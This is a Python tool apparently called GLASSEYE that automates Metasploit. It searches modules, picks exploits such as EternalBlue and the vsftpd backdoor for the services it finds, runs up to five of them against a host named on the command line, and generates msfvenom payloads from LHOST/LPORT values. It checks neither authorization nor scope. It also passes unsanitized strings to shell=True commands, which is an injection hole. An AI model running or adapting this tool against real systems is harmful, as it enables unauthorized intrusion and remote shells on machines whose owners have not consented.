#!/usr/bin/env python3
"""
GLASSEYE AI OS - Metasploit Framework Integration
Full MSF integration with module search, exploit execution, and payload generation
"""

import json
import subprocess
import re
import sys
from dataclasses import dataclass, asdict
from typing import List, Dict, Any, Optional
from pathlib import Path
from datetime import datetime

sys.path.append('/home/x/glasseye')
from memory_system import GlasseyeMemory


@dataclass
class MSFModule:
    """Metasploit module information"""
    name: str
    type: str  # exploit, auxiliary, post, payload
    description: str
    rank: str
    disclosure_date: Optional[str]
    targets: List[str]
    references: List[str]


@dataclass
class MSFSession:
    """Active Metasploit session"""
    session_id: int
    session_type: str
    target: str
    exploit_used: str
    created_at: str
    active: bool


class MetasploitIntegration:
    """Metasploit Framework integration"""
    
    def __init__(self):
        self.memory = GlasseyeMemory()
        self.msf_path = "/usr/bin/msfconsole"
        self.sessions: List[MSFSession] = []
        
    def check_msf_available(self) -> bool:
        """Check if Metasploit is installed"""
        try:
            result = subprocess.run(
                ['which', 'msfconsole'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def search_modules(self, query: str, module_type: Optional[str] = None) -> List[MSFModule]:
        """Search for Metasploit modules"""
        print(f"[*] Searching Metasploit for: {query}")
        
        try:
            cmd = f"msfconsole -q -x 'search {query}; exit' 2>/dev/null"
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            modules = self._parse_search_results(result.stdout)
            
            if module_type:
                modules = [m for m in modules if m.type == module_type]
            
            print(f"[+] Found {len(modules)} modules")
            return modules
            
        except Exception as e:
            print(f"[-] Search failed: {e}")
            return []
    
    def _parse_search_results(self, output: str) -> List[MSFModule]:
        """Parse msfconsole search output"""
        modules = []
        
        # Parse module lines (format: # Name Disclosure Date Rank Check Description)
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#') or line.startswith('='):
                continue
            
            # Extract module info using regex
            # Example: exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average  Yes  MS17-010...
            parts = line.split()
            if len(parts) >= 4:
                module = MSFModule(
                    name=parts[0],
                    type=parts[0].split('/')[0] if '/' in parts[0] else 'unknown',
                    description=' '.join(parts[4:]) if len(parts) > 4 else '',
                    rank=parts[2] if len(parts) > 2 else 'unknown',
                    disclosure_date=parts[1] if len(parts) > 1 else None,
                    targets=[],
                    references=[]
                )
                modules.append(module)
        
        return modules
    
    def get_module_info(self, module_name: str) -> Dict[str, Any]:
        """Get detailed information about a module"""
        print(f"[*] Getting info for: {module_name}")
        
        try:
            cmd = f"msfconsole -q -x 'info {module_name}; exit' 2>/dev/null"
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            info = self._parse_module_info(result.stdout)
            print(f"[+] Retrieved module information")
            return info
            
        except Exception as e:
            print(f"[-] Info retrieval failed: {e}")
            return {}
    
    def _parse_module_info(self, output: str) -> Dict[str, Any]:
        """Parse module info output"""
        info = {
            'name': '',
            'description': '',
            'authors': [],
            'platform': [],
            'targets': [],
            'options': [],
            'references': []
        }
        
        current_section = None
        
        for line in output.split('\n'):
            line = line.strip()
            
            if line.startswith('Name:'):
                info['name'] = line.split(':', 1)[1].strip()
            elif line.startswith('Description:'):
                info['description'] = line.split(':', 1)[1].strip()
            elif line.startswith('Platform:'):
                info['platform'] = [p.strip() for p in line.split(':', 1)[1].split(',')]
            elif 'Basic options:' in line:
                current_section = 'options'
            elif 'Targets:' in line:
                current_section = 'targets'
        
        return info
    
    def execute_module(self, module_name: str, target: str, options: Dict[str, str] = None) -> Dict[str, Any]:
        """Execute a Metasploit module"""
        print(f"\n[*] Executing module: {module_name}")
        print(f"[*] Target: {target}")
        
        if options is None:
            options = {}
        
        # Build msfconsole command
        commands = [
            f"use {module_name}",
            f"set RHOSTS {target}",
            f"set RHOST {target}",
        ]
        
        # Add custom options
        for key, value in options.items():
            commands.append(f"set {key} {value}")
        
        # Add exploit/run command based on module type
        if module_name.startswith('exploit/'):
            commands.append("exploit")
        elif module_name.startswith('auxiliary/'):
            commands.append("run")
        
        commands.append("exit")
        
        # Execute
        cmd_string = '; '.join(commands)
        
        try:
            print(f"[*] Running Metasploit module...")
            
            # Create resource file for cleaner execution
            rc_file = f"/tmp/glasseye_msf_{datetime.now().timestamp()}.rc"
            with open(rc_file, 'w') as f:
                f.write('\n'.join(commands))
            
            result = subprocess.run(
                [' msfconsole', '-q', '-r', rc_file],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Clean up
            Path(rc_file).unlink(missing_ok=True)
            
            # Parse results
            success = self._check_exploit_success(result.stdout)
            
            exploit_result = {
                'module': module_name,
                'target': target,
                'success': success,
                'output': result.stdout,
                'timestamp': datetime.now().isoformat()
            }
            
            if success:
                print(f"[+] Module executed successfully!")
            else:
                print(f"[-] Module execution completed (check output for results)")
            
            # Store in memory
            self.memory.store_exploit(exploit_result)
            
            return exploit_result
            
        except subprocess.TimeoutExpired:
            print(f"[-] Execution timed out after 60 seconds")
            return {
                'module': module_name,
                'target': target,
                'success': False,
                'output': 'Execution timed out',
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            print(f"[-] Execution failed: {e}")
            return {
                'module': module_name,
                'target': target,
                'success': False,
                'output': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def _check_exploit_success(self, output: str) -> bool:
        """Check if exploit was successful"""
        success_indicators = [
            'session opened',
            'command shell',
            'meterpreter',
            'exploit completed successfully',
            'connection established'
        ]
        
        output_lower = output.lower()
        return any(indicator in output_lower for indicator in success_indicators)
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, format: str = 'elf') -> Optional[bytes]:
        """Generate a payload using msfvenom"""
        print(f"[*] Generating payload: {payload_type}")
        print(f"[*] LHOST: {lhost}, LPORT: {lport}, Format: {format}")
        
        try:
            cmd = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format,
                '-o', '/tmp/glasseye_payload'
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"[+] Payload generated successfully")
                with open('/tmp/glasseye_payload', 'rb') as f:
                    payload_data = f.read()
                return payload_data
            else:
                print(f"[-] Payload generation failed: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"[-] Payload generation error: {e}")
            return None
    
    def smart_exploit_selection(self, target_intel: Dict[str, Any]) -> List[str]:
        """Intelligently select exploits based on target intelligence"""
        print(f"\n[*] Selecting exploits based on target intelligence")
        
        selected_modules = []
        services = target_intel.get('services', [])
        os_info = target_intel.get('os', '')
        
        # Map services to exploit modules
        service_exploit_map = {
            'ssh': ['auxiliary/scanner/ssh/ssh_login', 'auxiliary/scanner/ssh/ssh_enumusers'],
            'ftp': ['exploit/unix/ftp/vsftpd_234_backdoor', 'auxiliary/scanner/ftp/ftp_login'],
            'smb': ['exploit/windows/smb/ms17_010_eternalblue', 'auxiliary/scanner/smb/smb_version'],
            'http': ['auxiliary/scanner/http/http_version', 'auxiliary/scanner/http/dir_scanner'],
            'mysql': ['auxiliary/scanner/mysql/mysql_login', 'auxiliary/admin/mysql/mysql_enum'],
            'postgresql': ['auxiliary/scanner/postgres/postgres_login'],
            'rdp': ['auxiliary/scanner/rdp/rdp_scanner'],
        }
        
        print(f"[*] Analyzing {len(services)} services")
        
        for service in services:
            service_lower = service.lower()
            
            for key, modules in service_exploit_map.items():
                if key in service_lower:
                    selected_modules.extend(modules)
                    print(f"[+] Selected exploits for {key}: {len(modules)} modules")
        
        # Remove duplicates
        selected_modules = list(set(selected_modules))
        
        print(f"[+] Total selected modules: {len(selected_modules)}")
        return selected_modules
    
    def run_smart_exploitation(self, target: str) -> Dict[str, Any]:
        """Run intelligent exploitation using target intelligence"""
        print(f"\n{'='*60}")
        print(f"GLASSEYE METASPLOIT SMART EXPLOITATION")
        print(f"Target: {target}")
        print(f"{'='*60}\n")
        
        # Check MSF availability
        if not self.check_msf_available():
            print(f"[-] Metasploit not found! Install with: sudo apt install metasploit-framework")
            return {'error': 'Metasploit not installed'}
        
        print(f"[+] Metasploit Framework detected")
        
        # Get target intelligence
        intel = self.memory.get_target_intelligence(target)
        
        if not intel:
            print(f"[-] No intelligence found for {target}")
            print(f"[*] Run autonomous reconnaissance first:")
            print(f"    python3 autonomous_recon.py {target}")
            return {'error': 'No target intelligence found'}
        
        print(f"[+] Loaded intelligence for {target}")
        
        # Select exploits
        modules = self.smart_exploit_selection(intel)
        
        if not modules:
            print(f"[-] No applicable Metasploit modules found")
            return {'error': 'No applicable modules'}
        
        # Execute modules
        results = []
        successful = 0
        
        for module in modules[:5]:  # Limit to 5 modules for demo
            result = self.execute_module(module, target)
            results.append(result)
            
            if result['success']:
                successful += 1
        
        # Summary
        print(f"\n{'='*60}")
        print(f"METASPLOIT EXPLOITATION COMPLETE")
        print(f"{'='*60}")
        print(f"Modules executed: {len(results)}")
        print(f"Successful: {successful}")
        print(f"Failed: {len(results) - successful}")
        print(f"Success rate: {(successful/len(results)*100) if results else 0:.1f}%")
        print(f"{'='*60}\n")
        
        return {
            'target': target,
            'total_modules': len(results),
            'successful': successful,
            'failed': len(results) - successful,
            'results': results
        }


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 metasploit_integration.py <target>")
        print("Example: python3 metasploit_integration.py 192.168.1.100")
        sys.exit(1)
    
    target = sys.argv[1]
    msf = MetasploitIntegration()
    
    # Run smart exploitation
    result = msf.run_smart_exploitation(target)
    
    # Save results
    output_file = f"/home/x/glasseye/memory/metasploit_{target.replace('.', '_')}.json"
    Path(output_file).parent.mkdir(parents=True, exist_ok=True)
    
    with open(output_file, 'w') as f:
        json.dump(result, f, indent=2)
    
    print(f"[+] Results saved to: {output_file}")


if __name__ == "__main__":
    main()
